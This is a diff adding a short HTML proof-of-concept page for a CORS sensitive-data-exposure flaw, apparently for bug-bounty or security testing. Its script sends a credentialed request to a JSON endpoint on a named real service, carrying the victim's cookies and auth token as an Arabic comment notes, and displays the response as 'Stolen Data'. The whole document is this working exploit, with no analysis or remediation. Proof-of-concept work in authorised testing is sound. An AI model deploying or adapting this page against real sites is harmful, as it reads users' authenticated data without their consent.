@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS / Sensitive Data Exposure PoC</title>
+</head>
+<body>
+    <h1>PoC to Fetch Data</h1>
+    <script>
+        fetch('https://app.segment.com/_meta_.json', {
+            method: 'GET',
+            credentials: 'include' // عشان يبعت الـ Cookies والـ auth_token
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Stolen Data:', data);
+            alert('Response Data Captured: ' + JSON.stringify(data));
+        })
+        .catch(error => console.error('Error (CORS Blocked):', error));
+    </script>
+</body>
+</html>
